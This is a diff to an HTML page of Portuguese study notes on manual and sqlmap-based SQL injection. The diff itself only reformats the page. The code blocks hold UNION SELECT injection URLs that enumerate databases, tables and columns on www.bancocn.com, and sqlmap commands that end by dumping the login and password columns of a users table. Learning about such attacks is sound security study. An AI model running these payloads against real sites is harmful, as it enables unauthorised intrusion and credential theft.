@@ -37,7 +37,7 @@
         <div class="col-sm-12" id="titulo">
             <h1>SQL Injection</h1>
             <h6><strong>SQL Injection manual e automatizado com Sqlmap</strong></h6>
-            <a href="../../resumos/seguranca.html" class="btn btn-link" id="btnLink">Voltar</a>
+            <a href="../../index.html" class="btn btn-link" id="btnLink">Voltar</a>
         </div>
 
         <div class="col-sm-12">
@@ -62,10 +62,8 @@ www.bancocn.com/cat.php?id=-1 union select 1, 2, database() //nome do database
             <p id="textoPost">Dentro da table schemata estão os nomes dos Databases existentes (schema_name). Schema é o mesmo que Database. No caso, existem mais Databases cadastrados, porém o usuário de acesso do Database não possui permissões de acesso.</p>
 <small><pre><code>
 www.bancocn.com/cat.php?id=-1 union select 1, 2, group_concat(schema_name) from information_schema.schemata
-<b>Nome das tables:</b>
-www.bancocn.com/cat.php?id=-1 union select 1, 2, group_concat(table_name) from information_schema.tables where table_schema="bancocn"
-<b>Nome das columns:</b>
-www.bancocn.com/cat.php?id=-1 union select 1, 2, group_concat(column_name) from information_schema.columns where table_schema="bancocn" and table_name="users"
+<b>Nome das tables</b>: www.bancocn.com/cat.php?id=-1 union select 1, 2, group_concat(table_name) from information_schema.tables where table_schema="bancocn"
+<b>Nome das columns</b>: www.bancocn.com/cat.php?id=-1 union select 1, 2, group_concat(column_name) from information_schema.columns where table_schema="bancocn" and table_name="users"
 </code></pre></small>
             <br>
             <h4>Dados das Columns</h4>
@@ -92,12 +90,9 @@ sqlmap -r lista.txt --dbs --dbms=mysql
             <img src="../anexos/sqlInjection/sqlmap.png" width="400px" class="img-fluid">
             <br><br>
 <small><pre><code>
-<b>Nome das tables:</b>
-sqlmap -r lista.txt --dbms=mysql -D bancocn --tables
-<b>Columns da table:</b>
-sqlmap -r lista.txt --dbms=mysql -D bancocn -T users --columns
-<b>Dados das columns:</b>
-sqlmap -r lista.txt --dbms=mysql -D bancocn -T users -C login,password --dump
+<b>Nome das tables</b>: sqlmap -r lista.txt --dbms=mysql -D bancocn --tables
+<b>Columns da table</b>: sqlmap -r lista.txt --dbms=mysql -D bancocn -T users --columns
+<b>Dados das columns</b>: sqlmap -r lista.txt --dbms=mysql -D bancocn -T users -C login,password --dump
 </code></pre></small>
             <img src="../anexos/sqlInjection/sqlmap2.png" width="400px" class="img-fluid">
             <br><br>
